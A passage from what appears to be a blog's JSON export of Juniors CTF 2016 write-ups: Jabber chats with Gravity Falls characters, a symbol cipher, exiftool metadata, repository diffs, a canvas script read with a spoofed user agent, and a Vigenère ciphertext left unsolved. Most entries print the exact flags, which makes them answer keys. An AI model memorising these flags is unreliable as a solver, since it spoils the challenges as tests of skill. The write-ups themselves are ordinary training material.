Joy","slug":"JuniorCTF-2016-network-Skeleton-in-the-closet","date":"2016-11-26T23:00:00.000Z","updated":"2017-02-07T18:23:37.008Z","comments":true,"path":"en/JuniorCTF-2016-network-Skeleton-in-the-closet/","link":"","permalink":"https://rawsec.ml/en/JuniorCTF-2016-network-Skeleton-in-the-closet/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : Juniors CTF 2016 Website : juniors.ctf.org.ru Type : Online Format : Jeopardy CTF Time : link Description categories: network, joy, admin #hint for task with jabber: try to use another clients because clients works differently with anonymous auth. Solution 12$ echo dipper lo-o-ssE-bo |tr ipodlEsb- ab0j1328.jabber 10.0.223.80 with pidgin &amp; wireshark domain: 10.0.223.80 server: 10.0.223.80 change domaine to: mystery-hack.gravity.falls domain: mystery-hack.gravity.falls server: 10.0.223.80 Pidgin can't be used because it doesn't support anonymous connection. Use Profanity instead: 1/connect anonymous@mystery-hack.gravity.falls server 10.0.223.80 Some people are connected: 1234dipper@mystery-hack.gravity.fallsrootru2en@bot.talk.google.comstand Let's talk to dipper@mystery-hack.gravity.falls: 1/msg dipper@mystery-hack.gravity.falls hello He told us: Russian: Я очень смышленый парень. Но сейчас не понимаю ни слова. English: I am very clever guy. But now I do not understand a word. We talked to stand: Russian: Это ты что сейчас сказал? Всегда четко формулируй, что тебе надо. Ты что, русского языка не понимаешь. Тогда тебе сюда: ru2en@bot.talk.google.com English: That's what you have just said that? Always articulate what you need. What, you do not understand the Russian language. Then you here: ru2en@bot.talk.google.com Admins said us that ru2en@bot.talk.google.com doesn't work and we need to use Google Translate and speak to dipper@mystery-hack.gravity.falls in russian only. We tried to invite him in a room but he didn't want to come in: 123/join/room accept/invite dipper@mystery-hack.gravity.falls We tried to get some infos about him: 123/info dipper@mystery-hack.gravity.falls11:51:30 - dipper@mystery-hack.gravity.falls:11:51:30 - Subscription: none We checked upload: 12/sendfile /etc/hosts11:55:25 - XEP-0363 HTTP File Upload is not supported by the server We added him in contact, check if he had a pgp public key, wanted to subscribe to his presence and allow him to see ours, but it seems he doesn't want to be our friend: 1234567/roster add dipper@mystery-hack.gravity.falls/pgp contacts/sub request dipper@mystery-hack.gravity.falls/sub allow dipper@mystery-hack.gravity.falls/sub show dipper@mystery-hack.gravity.falls12:20:08 - Awaiting subscription responses from:12:20:08 - dipper@mystery-hack.gravity.falls Last activity requests are forbidden: 12/lastactivity dipper@mystery-hack.gravity.falls12:24:27 - Last activity request failed for dipper@mystery-hack.gravity.falls: forbidden Someone in the Telegram chat talked about mabel, so we tried: 1/msg mabel@mystery-hack.gravity.falls hello He said us: russian: Не понимаю, чего вы хотите? Я богиня разрушения! english: I do not know what you want? I am the goddess of destruction! Try to list rooms again, this times it works: 12345/rooms13:08:11 - Chat rooms at conference.mystery-hack.gravity.falls:13:08:11 - hall@conference.mystery-hack.gravity.falls, (hall (12))13:08:11 - dipper@conference.mystery-hack.gravity.falls, (dipper (1))13:08:11 - flag_shop@conference.mystery-hack.gravity.falls, (flag_shop (4)) We joined hall (/join hall), there is some users: Moderators: stan Participants: dipper, Gideon, mabel, soos, wendy Visitors: ctf players I suppose We talked to soos: russian: Чувак, я тебя не понимаю. Хотя мудрость - мое благословение и проклятие. english: Dude, I do not understand you. Although wisdom - my blessing and a curse. When we talk, giving only keywords, nobody understand us so let's try some complete sentences: To stan: 123456789Me:Я хочу, чтобы флаг, пожалуйста. (I want the flag, please.)stan:Хотите флаг? (You want to flag?)Могу предложить флаг Конфедерации за сотку баксов. (I can offer the Confederate flag for a hundred bucks.)Пока рядом нет полиции - все законно! (While not near the police - all legally!)ХА-ХА-ХА!!! (Ha-ha-ha !!!)Если есть какие-то вопросы - обратитесь к soos (If you have any questions - please contact soos) To soos: 123456789Me:Я хочу, чтобы флаг, пожалуйста. (I want the flag, please.)soos:Можно вопрос, зачем тебе флаг? (It is possible to question, why do you a flag?)Лучше обратись к dipper, он специалист по загадкам. (Better to turn to the dipper, he riddles specialist.)Вообще-то я второстепенный персонаж. (Actually, I&apos;m a minor character.)О боже, второстепенные персонажы погибают в первые пять минут. (Oh God, the secondary characters are killed in the first five minutes.)Что же делать? (What to do?) Ok so let's talk to dipper: 12345678Me:Я хочу, чтобы флаг, пожалуйста. (I want the flag, please.)dipper:Флаг? Причем тут флаг? (Flag? And the flag here?)Это очередная загадка Гравити Фолз?. (This is another mystery Gravity Falls ?.)Я ее обязательно разгадаю. (I&apos;m sure it unravel.)Но сейчас мне некогда, у меня свидание с wendy. (But now I have no time, I have a date with wendy.) Let's try wendy: 1234567Me:Я хочу, чтобы флаг, пожалуйста. (I want the flag, please.)wendy:Флаг? Ну да. Почему бы и нет. (Flag? Well yes. Why not.)Хотя лучше утка. Или панда. (Although better duck. Or panda.)Но по животным у нас специалист mabel (But animals have specialist mabel) mabel: 12345678Me:Я хочу, чтобы флаг, пожалуйста. (I want the flag, please.)mabel:Флаг? Нелегально? Я легализую всё, что только можно!&quot; (Flag? Illegally? I legalize everything that is possible!)Ой, забыла предстваиться. (Oh, I forgot to introduce myself.)Привет, я Мэйбл. Мне двенадцать. (Hi, I&apos;m Mabel. I was twelve.)У меня есть waddles. Хотите пожениться? (I have waddles. Want to get married?) waddles: 123456Me:Я хочу, чтобы флаг, пожалуйста. (I want the flag, please.)waddles:Флаг: 骨架 (Flag: 骨架)Досвидания. (Bye.) And 骨架 in chinese means skeleton. We must submit the flag in chinese, not in english. Note: Jabber server was very unstable and we get a lot of Lost connection. messages. So we used /reconnect 1. Feedback: russian content everywhere, taht's pain for non-russian people, use english only. No flag format, flag are meaningless so it may be hard to know when you get the flag or not, they need to use a flag format or give in the description what the flag have to look like. This was a joy only challenge, there is no security in this challenge, so that must not be in a CTF or that should give very few points.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"joy","slug":"joy","permalink":"https://rawsec.ml/tags/joy/"}]},{"title":"Juniors CTF - 200 - Here goes ! - Recon","slug":"JuniorCTF-2016-recon-Here-goes","date":"2016-11-26T23:00:00.000Z","updated":"2017-02-07T18:23:36.998Z","comments":true,"path":"en/JuniorCTF-2016-recon-Here-goes/","link":"","permalink":"https://rawsec.ml/en/JuniorCTF-2016-recon-Here-goes/","excerpt":"","text":"Informations Version By Version Comment Chill3d 1.0 Creation CTF Name : Juniors CTF 2016 Website : juniors.ctf.org.ru Type : Online Format : Jeopardy CTF Time : link Description categories: trivial, crypto, recon Solution This challenge was the first crypto challenge of the Junior CTF 2016. First, it's pretty easy to know that the flag is encoded in shapes in the bottom left of this picture. But the question is, how to translate/decode it ? Go on Google Image and proceed at a picture search... We find this link : http://gravityfalls.wikia.com/wiki/Nightmare_Head/Gallery So, this capture come from Gravity Falls... Let's navigate on the wiki... A page is talking about a list of cryptogram, interesting :smirk: (http://gravityfalls.wikia.com/wiki/List_of_cryptograms) Oh ! In Bill's symbol substitution cipher we find shapes that are on the picture ! (http://gravityfalls.wikia.com/wiki/List_of_cryptograms#Bill.27s_symbol_substitution_cipher). If we replace shapes by letters we find the following text : FIXPROBLEMQUICKLYWITHGALVANIZEDJETS. Flag : FIXPROBLEMQUICKLYWITHGALVANIZEDJETS :tada:","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"reconnaissance","slug":"reconnaissance","permalink":"https://rawsec.ml/tags/reconnaissance/"}]},{"title":"Juniors CTF - 100 - Black Suprematic Square - Web","slug":"JuniorCTF-2016-web-Black-Suprematic-Square","date":"2016-11-26T23:00:00.000Z","updated":"2017-02-07T18:23:36.985Z","comments":true,"path":"en/JuniorCTF-2016-web-Black-Suprematic-Square/","link":"","permalink":"https://rawsec.ml/en/JuniorCTF-2016-web-Black-Suprematic-Square/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : Juniors CTF 2016 Website : juniors.ctf.org.ru Type : Online Format : Jeopardy CTF Time : link Description categories: trivial, web M.Iu.Lupanov source: 123456789[...]&lt;div id=\"task_header\"&gt;Black Suprematic Square&lt;/div&gt;&lt;div id=\"task_body\"&gt; &lt;center&gt; &lt;div style=\"width: 478px;\"&gt;&lt;img src = \"http://juniors.ucoz.net/Black_Suprematic_Square.jpg\" &gt;&lt;img src = \"http://juniors.ucoz.net/Black_And_White_Symbols.jpg\" width=0&gt;&lt;/div&gt;[...] This image was hidden: Solution 1234567891011121314151617181920212223242526[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––[~/CTF/JuniorCTF/2016]$ exiftool Black-Suprematic-Square/Black_And_White_Symbols.jpgExifTool Version Number : 10.20File Name : Black_And_White_Symbols.jpgDirectory : Black-Suprematic-SquareFile Size : 76 kBFile Modification Date/Time : 2016:11:22 02:19:51+01:00File Access Date/Time : 2016:11:25 16:15:54+01:00File Inode Change Date/Time : 2016:11:25 16:15:54+01:00File Permissions : rw-r--r--File Type : JPEGFile Type Extension : jpgMIME Type : image/jpegJFIF Version : 1.01Resolution Unit : inchesX Resolution : 72Y Resolution : 72Comment : aima0AiwahsidupaiToehoong1PhieruqueivahphieKah7uceetair9aiGae1eSsaedoo4becooShohhu8eifahXi7EJoh2gaephechei5chiP9Image Width : 477Image Height : 406Encoding Process : Progressive DCT, Huffman codingBits Per Sample : 8Color Components : 3Y Cb Cr Sub Sampling : YCbCr4:4:4 (1 1)Image Size : 477x406Megapixels : 0.194 aima0AiwahsidupaiToehoong1PhieruqueivahphieKah7uceetair9aiGae1eSsaedoo4becooShohhu8eifahXi7EJoh2gaephechei5chiP9 was the flag. Feedback: no flag format, flag are meaningless so it may be hard to know when you get the flag or not, they need to use a flag format or give in the description what the flag have to look like.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"Juniors CTF - 400 - Dirty Repo - Forensics","slug":"JuniorCTF-2016-forensics-Dirty-Repo","date":"2016-11-26T23:00:00.000Z","updated":"2017-02-07T18:23:36.972Z","comments":true,"path":"en/JuniorCTF-2016-forensics-Dirty-Repo/","link":"","permalink":"https://rawsec.ml/en/JuniorCTF-2016-forensics-Dirty-Repo/","excerpt":"","text":"Informations Version By Version Comment Chill3d 1.0 Creation CTF Name : Juniors CTF 2016 Website : juniors.ctf.org.ru Type : Online Format : Jeopardy CTF Time : link Description categories: admin, forensics Gruncle Stan loves money very much and doesn't shun to use unacceptable tricks to get it. Not so far he started a new project with an aim to embezzlement of public funds. He hired some developers and decided to &quot;borrow&quot; source code. But one liberal-minded young man didn't like, that Stan's project is a plagiarism. This zealous fighter for justice decided to spoil one developer's project. Try to find out, what the malefactor added. Here are all developers' projects -&gt; WORKDIRS Solution In this challenge, we get a tar.gz file. In it, there are 20 tar.gz files containing git repo from openvpn. So first, I unzip all tar.gz file, and I seek so differences between repos : 1234567$ diff -r comp_1 comp_2Binary files comp_1/openvpn/.git/index and comp_2/openvpn/.git/index are differents$ diff -r comp_1 comp_3$ diff -r comp_1 comp_4$ diff -r comp_1 comp_5132a133&gt; //FLAG -&gt; gRunCle_StAn_tHe_woRsT_coDeR Flag : gRunCle_StAn_tHe_woRsT_coDeR","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"Juniors CTF - 300 - Six Strange Tales - Web","slug":"JuniorCTF-2016-web-Six-Strange-Tales","date":"2016-11-26T23:00:00.000Z","updated":"2017-02-07T18:23:37.028Z","comments":true,"path":"en/JuniorCTF-2016-web-Six-Strange-Tales/","link":"","permalink":"https://rawsec.ml/en/JuniorCTF-2016-web-Six-Strange-Tales/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : Juniors CTF 2016 Website : juniors.ctf.org.ru Type : Online Format : Jeopardy CTF Time : link Description categories: web Gruncle Stan, what's the secret of the six fingered hand? Can you see these codes? When the six fingered hand touches them, one of the Gravity Falls secrets opens! Gruncle, but how should we read the secret? From left to right or right to left? Or maybe upside down? It depends on whether you are a Christian, a Muslim or a Taoist... Lupanov M.Iu. Solution Let's see source code of the web page: 123456789101112131415161718192021222324252627282930313233343536373839[...]&lt;canvas id=\"img\" width=\"717\" height=\"380\"&gt;flag=&#123;fH7eAHJT3tXWD1e7afAvVfhcb&#125; &lt;/canvas&gt;&lt;script type=\"text/javascript\"&gt; &lt;!--window.addEventListener('load', function () &#123;var b = document.getElementById('img');var a = b.getContext('2d');var d = new Image();d.src = \"http://i.imgur.com/GIYH3fA.png\";d.addEventListener('load', function () &#123;a.drawImage(this, 0, 0);k = 174;l = 345;m = 12;n = 89;o = 671;p = 18;q = 222;r = q-1;c=\"rgba(0,0,0,0)\";if (navigator.userAgent == \"Gravity Falls\")c=c.replace(/(0)(\\))/,\"$1.5$2\");a.fillStyle = c; a.fillRect(q%m-6, k-3, n+r-q-2, 5-(p-q));a.fillRect(2*(q+1), p+1, n+r-q+2, l+16);a.fillRect(l+r-30, o%p-5, 2*l-600, q+5-p);a.fillRect(q%n+42, o%p-5, o-600+p+1, 2*(p+1));a.fillRect(176, o%p-5, 2*l-600, q/2*3+47);a.fillRect(2*k+p-100, q%m-6, o-600+p+1, n+r-m/2);a.fillRect(o%p-5, q%m-6, 2*l-604, k-p-4);a.fillRect(2*k+p-100, q/2*3-10, 3*m+p*3, (p+1)*3);a.fillRect(2*k+p-m+2, q%m-6,2*l-600, q+n+m-190);a.fillRect(2*k+p-10, k-p-m/3, o-600+p+1, r+m*2/3+p);a.fillRect(n-3, q-k+9, 2*(l-300), q+n+m);a.fillRect(l+q-31, q+m/2,2*l-600, k-p-m/3);a.fillRect(o-2*p-p/2, q%m-6, 2*l-600, q/2*3+47);&#125;,false);&#125;,false);// --&gt;&lt;/script&gt; flag={fH7eAHJT3tXWD1e7afAvVfhcb} is not the good flag, it needs transformations. We can see that we need a different user agent: Gravity Falls. We changed our user agent to Gravity Falls and reloaded the page, the image has changed: Let's mix them: AhWae2Oh, Is4feeh3, ud2juD9a, aej8eeTh, Maiy2au0, dawu0Aeb. left to right: AhWae2OhIs4feeh3ud2juD9aaej8eeThMaiy2au0dawu0Aeb right to left: dawu0AebMaiy2au0aej8eeThud2juD9aIs4feeh3AhWae2Oh upside down: Maiy2au0Is4feeh3aej8eeThAhWae2Ohdawu0Aebud2juD9a http://gravityfalls.wikia.com/wiki/Scary-oke is no help. AhWae2OhIs4feeh3ud2juD9aaej8eeThMaiy2au0dawu0Aeb was the flag. Feedback: This is more a joy than a web and this isn't really about security. I'm tired to see challenge like that. No flag format, flag are meaningless so it may be hard to know when you get the flag or not, they need to use a flag format or give in the description what the flag have to look like.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"Juniors CTF - 100 - Find The Gobblewonker - Network","slug":"JuniorCTF-2016-network-Find-The-Gobblewonker","date":"2016-11-26T23:00:00.000Z","updated":"2017-02-07T18:23:36.992Z","comments":true,"path":"en/JuniorCTF-2016-network-Find-The-Gobblewonker/","link":"","permalink":"https://rawsec.ml/en/JuniorCTF-2016-network-Find-The-Gobblewonker/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : Juniors CTF 2016 Website : juniors.ctf.org.ru Type : Online Format : Jeopardy CTF Time : link Description categories: trivial, network, admin, web Do you want to find yourself on an island wih monsters? Here are cordinates of it 10.0.17.131 But it's not as easy as it seems. You need a boat. You will find the boat there: https://scoreboard.ctf.org.ru/vpn/YOU_TEAM_TOKEN.7z You'll need this boat for travelling to the other islands. Fair winds and following seas! M.Iu.Lupanov Solution Download your VPN archive. Of course unzip it. Connect with OpenVPN. Go to 10.0.17.131. And see: Flag was q8mvbp8sFNPpFj2dZkEkweNEFdBIuhVYkEr2brnj2qstJ3QbAtklx0imht8pdb2PafDIXs3Sxojl3m5q.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"network","slug":"network","permalink":"https://rawsec.ml/tags/network/"}]},{"title":"Juniors CTF - 300 - Southern Cross - Cryptography","slug":"JuniorCTF-2016-crypto-southern-cross","date":"2016-11-26T23:00:00.000Z","updated":"2017-02-07T18:23:36.952Z","comments":true,"path":"en/JuniorCTF-2016-crypto-southern-cross/","link":"","permalink":"https://rawsec.ml/en/JuniorCTF-2016-crypto-southern-cross/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : Juniors CTF 2016 Website : juniors.ctf.org.ru Type : Online Format : Jeopardy CTF Time : link Description categories: crypto Wow, what's this, Soos? It's the Confederacy's cipher disk with a help of which southerners encrypted their messages. How does it work? Look, Dipper. We need to encode the phrase MABLE EATS SPRINKLES. We don't need any spaces so just delete them. We get MABLEEATSSPRINKLES. Then we have too choose a key. Let it be GRAVITY. And let's go !!! https://youtu.be/Fpzrs-fcNKM You see, we've encrypted the phrase and here it is RBZTXYZJSKZBLQCEN Cool! Now I'll encode a famous story and you'll try to decode it. By the way, it's much more interesting to read the whole story over, isn't it? .... That's complicated. Maybe I have to find a key at first. I'd better look for someone who is able to solve this... Don't forget to reach to the end of the text! The ending is greatly important. Solution Mmmh, it sounds like polyalphabetic substitution cipher, it looks like Vigenere. We have additional proofs, title is Southern Cross making a reference to the Confederate cipher disks used in the Civil War [1]. The ciphertext is: 1UKPVOYDJZPAREJUCQBPCJPBEPZSLOGPBZXGSSDANTFQDPLVTRUOYSOOKBYPWIWRUSCJZSZESDBCERRIPWPSRERTBDOEUVPMIGZOSZNOHRUTLUJUJGZJMMATRITZZDJPAPWOHVSHSQIGJUVLBREIFBZBBOFETZZDTNIWWMOHVGWCMHAEXODTJWVSWYOOHVGSPLDNXICDMWOSUWOJVLCTVLZFDFEGZVVNUBEFIMTVSPCMYCIFSVQIDZBBNIGLVEXZPIBZHRZOXLZNPPLJNKISPVBIEFOYLNHFXSOBCEVOUTVZEIUVCMZRFVBOWMIWJQPADNGJSNMNOWPFOVVNTFHSIOTYFMNIMRZFREPZSVPFTNDCVTGZQHPIFGDMYTYFSYODNVFFHQOHKISTZKOJTWMQGIKJSDBCAKISCIDSVEPZBCHRORDQIAXFGECMEJVQSINATDCXXVNZFGEPZEABQFTVTZPBOWOECMOEBCETSWDXXODNOYLJFJIOCSYOUTCYECONBGWMVDVSCQBCERUHLKFIEHTZZXEKISPVBIEFSCLZSTFBOMYTFUVPOMOLORLVYUEDCFXGEUUVPMIGZOSLVYTVORPZOHVOXZPIBZHRZOKEIDVPLPPFOHSMXORMGAWMTZWSWGCECEHHWBUETIAWITYFSYODNVEFTDZRROREPZFZSSXIIAEEGFOBEJUSOBCAKUVPGMUEUVPMIGZOSQQATPZOCLNANBMLVYTYFFPIRAZUTFZOHVSCCLZRJTVLZFDFEGZVVNUCCMBDDSBZWAXOIOWYOOOGVHDCXHCPKRZVDVPFPINTYFDLANEEHSCAOHIPIRPOHVNWWTNTIVQVWPTWPFEPZRZDVAWXKVUCQBCEVYDCMNSTBFEPZYWPIYLOHVNSDAZNXFFDMMEEFWYBCESFZTMATYBHEPZSLOGPBZXGSSDARAJUOVQIGFOBZBCIEHAZZZSKJAFTVTZOULVYDROUPZJUJUVLVVQLBDFZVWYJZPJJBNBGVVJCBJBRBCIJJRPIJUKPTSQNHVBRHQOHKISMCOTVORZNCIJTWIACOFUSCACAILRZLNOEXODIGRVBRJLJSZOUEPZEOQFPANCRSGLNZWZUVOGIADJHPBCEJBTPMSPCPRPLOOKISECIEFG30000OWTBOCEOYLXUISSYKTTYFDLANEEHSCAOHIVGEBCEZSVPIYSTBGFIGLPPIEWATYFKTVYONTHZTJOBGCCBCEKIIYLZRTMCFLOHVDCYLPCKPFUMMKVEOEBCESFZWZJPVXVTKCSRHUPLYONOZZWNERORFVMEJJGEQIGRUVTAOUXTVLZFDFEGZVVNUCCMBDDSBZWEDTYUVPQMBFPHJQIAJUCFBXAEWODJVGKVAMTZDFVHZNOHVFLAZZSJDOCIIDIBBLEFWRSRWGDNKISTZCIXIVPMGEUCCZBNTFUVPMIGZOSEPZEEHWYMZRJVZWMILPBBRZTBLUKTAZRROHSMZNXJBPIXCFSRTVBTFPFOMMSIBDTLGYRXOJNMODUVPQIEIUHCIDNSVHMMAOIFHSQNWRTONKJMGMWDPZDKISPFKRVTGXMNSVOUPZMETPJPZZDWSCXJJBKJRMIGLJQSCAPAUFFEWIELUFLTDTPKIXXZDFVHZNCIJDOCEDTYBKTVXHVTHPZMIWMSLVYTFPYLBMITLWYBCEXBAPUMJFIBMQBDFHGTBOIEHCYBCETPOWBZNUFFFVRIKUWYOGYDBRPIRRFOUWMVDSZUTDDNXBBTUDTRUWZVJFRUOCOZTROREPZMVTGPVBEIUFFUKEUIWXEDTYBPLTGEOBQETTBVUKPMIHZTGSWPLUFFMTVDVTHSMXRVFYNPZVRMWPZJFZORFAORPSCWTZDFGTEWOHVHFZCIDKIIDQICIFODQIGKISDPVRVPTSQNCFNFLLZSZOHSMGOFUPJWIEJJLEPZATIHHWHICFGQZJMKISEIIKKISPVBIEFSCEVSFSRPZZDKPGEWKTYFFZJWEITKLDZDRESQQVNKBRTMPAEEDWCIGVERZEITYFGEMZPJMCAMDNKPHSMOHZDYHWJDJUVLBGIEFREPZTIBQVNDVVNWYCOEJPTNZVSYJBRBCRFVUSIOHZDYPBJFTIOAIMRRMPCWPGYUHSMHTFPDPVROFEGHPZRVUVCMZHFSGPAREIFHTMYTFMCHPVNXJBRJMAEDVPAJNVXODEVIKJBRNJRAPVYJDGUPUHPJWFVZOVZVVSFTLZBPOWRPOOIEOJIBAZOHSQNAEJALTOHVSCMJZRJEWGMNTVECQAVDUMSLVYBIJRWMVNUTSENMEVUVPGHOLOHPLOHVPHSMMTNPKTBCTYFPLOVCIPGDWIEGPAXMGAEEFZLZFRTHLVYWZUVOQNCIFHTWITYSCFOCTYFTZZZSKBBOCKAGSWXMQACMCYMGYXPFRMCEIFHSMVNZNOWBCAKCCCMWOSUWOJVLCTZTXKEUPBLUJSJZPZCGDVSOYLWRFLSLNJRVMSRBCEPTVZBCIDUVCWPGYUVPPZAUBHZVXERORDIODFXBEWCOCEONWPNTJZZNALZHVEUVDVTSNCMEWPFEPZPIFGPVOBPUVPBJRKVCFAORRJZEPZYYBREZVVVMZPLOHVRIPAOIFOCQBDMVXODVJLFOUPZNOSJUXIIYDJZPAVNUICFZNLRZPPBREVOHSMHAEEHSMNPIZSDBKOJTSEPVTTPIWLAOCMCHACAILRZLNOETVZZNENJHSBMAZMWYOMOGFOYLYRFQDPLWRZEZPXVNKFRLVYCIPDAMYTYBBVNPLCZCQBCEXSODAVLFOUEPZSKSSLUDNKISRWMGVCCMBDDSBZWWKEEFREPZSRDYOZZWFVHOWPBCFVLVYFLMGZNOHVOSLBKATLORMNOWDICZZNTZOYLOHVPBPAVCBPTRWGDRORNPPCBMSOEDTYUVPOGEVPTLKCICEGLGTOLPZOLJUSMSOMXKVEDTZVTVISNIGLVEXZGAUCMMEWYOUTCYGJUJBWOEZCFVZOLJIKZCFOJTRISLLAOIGWYIICZOUEPVTBOCNSNTYFVZZISFGTZNVNPUVTVBIEBFTHJNRXVLBVRVXSRWDNXUCOWVBFVHLPJSJGCCGJUSPPHMVIEUUZBGOEHHZEVIKISCMOHVZZWJZOEPICBMAZMPPNJRVEOJTDGYUWYBCEDPFYQIOYJUFMNSKIOEKVYLTSZNTOLSBWTXAISMOWPBCFTZZVWYJZPIISNFFPLOHVTOYOPIEFPZJRECMOYVZXKISQQMSKBBTUVLNFQZUZATSCDAWYAJBRWZSNFALLZAYBIWLDDEUKPIXCFSRTVOOKISXIMKJPBEPDSDPBPGOHVSSD3000015000IKIVDSTBNSYPFEWAWYBHTMSPVDHPLNAZEGSIMKUPRDWIKZDYTVBSFGHWGVTKISAIXKRHSDEDTYUVPBJEFGVTAWOFUOYLOHVOVPTJOBFRAMISZWSWGVTKISHMOSZESDWAHZTHTZZDYPFDMJLUCCWQQAITATOCTPOWRPKLRZSOWPTYFGLQYSCPKWGDWZTVEPVTJPFCMGOWZCFZNHREBEOJTYVFEAJDFJGLQYBFCVPIMTZMMMCOIKDOYBWEYFZAMYBFMWGIMSXPHATZNKZCQJJTKPASMGLXFHFAWOKITLZZNFVUSBJGVUTCMNHDPIYBNDROUTBNHRSYTKVNKISWXOHZOYTVCONGIYVTIKJGEPVTROSLAOEIOSCTDKVZCFKVNTPAPWPTYFFPIIDXJJPCNWVTHPZIFVMZZENCRSRDIIDJQOOMNIEUVPLZSGFFLLJBLTWYMNSNIOEXVRKPTEPZERTHHINYFVTCWHAEZKLGIENZCCSNTRUSDIDDJIOCSYOUTCYADTKJBRLJWEPBLJJUCESCIIDTISHQIGRUKTODWRTPZZIOEBTLZHIEVZDBZRTPIYBTIIBBLEVYWSCXPJMVXVPVDWRTGPDZNKFSYQOWRTOYIXCZESYBHYTPATVBWVTHTEVSNBZVQIACPBRBCEIPOOEDTYNMNTJTYFGTVVBLORWMHABJBQWMNVXMZZFCZUMTPVDROWOMVOWHCTVOHVSSLVYMRLWYTJTJPTXWIEPJOWEVYJGSWBGIBFWNWPLUECTBDCRNSEWVPCBQPWIEVWSYQIWYFFPBCEIPOONJRBFRLVYIUJRYBFNFXKSQXHWPFVBJTRLSTAOUUJSOIWOLUWENJRYBZQIIHFVFLVYTYFBTBJOBUVPTZFKIOYLOHRUBTOCTZSIYQITFUVPKVMGPTLEDLUXSDBNHFXHSIOWRTHCIQECMWYIHOEHHSMGIKUZPBJWETOYLDWVOHHMNTNJHSQOIMFCQBZNNPBOMMEUJTTEJUCEBEPVVVUICVZDFVHOQAFVSSYBDFZEHZWFTYFCEPZRIPOOWCIIFQVWIYFVRSIQEVORPLPPRCCFBOHVTOXMNAZEPZJOIUCOWTXHVFFQCGLPQVTTJSFQVTKVLZUOTVOTYFFZIYSNFHLSZIKTKSIOSZOGTLZOWVGEPVTDBYPAPSKVFYWPTKISHITWVECDPVRBECOAJNXPHFXVNUMSLVZDRHOTVNTRUFPMDDRHCZLYERMFLBCEIUVLBNOISSWWAYFVFYPVDEUVFZOHZNGPTABFCVPAVIUBULQIACNCDBKAKISEQXACMMDIHEYFFPIBRVFRMWWHVXODAPRVBTTZNTIBHPSDNUPTLKMONCOTBWUKCCWQQAIISWTKUCMIDBCRFVUSIGLIJUSBMETLCYEZDSFHEMMBVNCGQIOEIOOVOWVTVLZFICMPLOOHZTPZWYLVBUTVVNUXSWTCIKUVPBMAZMTZZCIXISCBDMSFFMWWTZEPLTGRVQZLKZDKISDXJICJBEPZBRHOYLOIVEHSMHOLUVZNDTKJUSBGYNJHSIXOIEKSMIHVMCZSZDLQHSMHOJUDCWHIEFBEWWJVDHEPVTYFGLERAJUVPUPZQMSZNNHRSYOWYSFOG45SMGDLQCYPDMNJHSWPTRXOGMMSKPDJWPRWVBYQISRJRMWWWZUVLOMIEXSRWOTFCSSQOTZOHSMWRVFNPAZTJUWWTNAZEGSIMKPPILQITXPWYBJHZUBZJMEVASMWWIYBHPBJTVMZJWPBLUHSMMERJBEIIYTIOYKZFFSPFBJNVPTFAWOCJJLZCEJQZPVOYKJFPLVNUISNIITTBFCGYOLCZPEZBVFBAIMDJNSLVYYFVGSIMKUPRDWIFFSHSZZEPFOCJJBJBWOYPIVUZJEZVVSWDSZDFVFWQQEJUCRMOHVSHTUZAEEORIDNZWSLTRAPTUTDZYFVODYPAIFRPIGAEEWEPJUXIHJWPWRTOXIIIMFVPIMDJPAPYPEVSGEWMIVTOMWPTPPIDPJOKJBZVZOIUKZUZNZOOAMXUCJOCEVYSVHTVZVVSPPTDEMFRPUIONJTJWPRVKIDBCAMJBLTDTKMSQCIWZUVXMNHRSYACOYFVFRCIUGBBOE